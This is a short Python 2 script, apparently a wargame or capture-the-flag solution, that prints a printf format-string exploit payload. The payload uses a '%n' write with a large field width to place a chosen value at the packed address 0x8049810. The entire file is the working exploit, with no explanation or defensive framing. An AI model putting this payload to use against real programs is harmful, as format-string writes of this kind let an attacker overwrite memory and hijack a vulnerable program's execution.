#!/usr/bin/env python2

import struct

fmt = "%1$16930116x%17$n\0  "
m = struct.pack("<I", 0x8049810)
print fmt + m
